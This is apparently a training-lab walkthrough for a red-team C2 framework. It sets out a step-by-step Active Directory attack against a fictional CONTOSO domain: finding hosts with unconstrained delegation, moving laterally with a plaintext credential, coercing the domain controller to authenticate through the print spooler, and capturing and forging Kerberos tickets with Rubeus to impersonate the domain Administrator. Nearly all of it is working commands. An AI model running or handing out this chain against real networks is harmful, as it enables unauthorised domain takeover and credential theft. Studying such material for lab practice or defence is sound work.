# Attack

1.  Use LDAP to find computers configured with unconstrained delegation.

    ```batch
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
    ```
2. Move laterally to _lon-ws-1_.
   2. make\_token CONTOSO\rsteel Passw0rd!
   3. jump psexec64 lon-ws-1 smb
3.  Run Rubeus in monitor mode on _lon-ws-1_.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
    ```
4.  From the medium-integrity Beacon, use a remote authentication trigger to force _lon-dc-1_ to authenticate to _lon-ws-1_.

    ```batch
    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
    ```

    > You may need to run it a few times.
5.  Use the TGT to request a usable service ticket for cifs/lon-dc-1, impersonating the default domain administrator.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT] /nowrap
    ```

    > The **/self** parameter is key here.
6.  Inject the ticket into a sacraficial logon session.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]
    ```
7. Impersonate the process.
   1. steal\_token \[PID]
8. Verify the ticket was injected.
   1. run klist
9. Use the ticket to list the C$ share on _lon-dc-1_.
   1. ls \\\lon-dc-1\c$
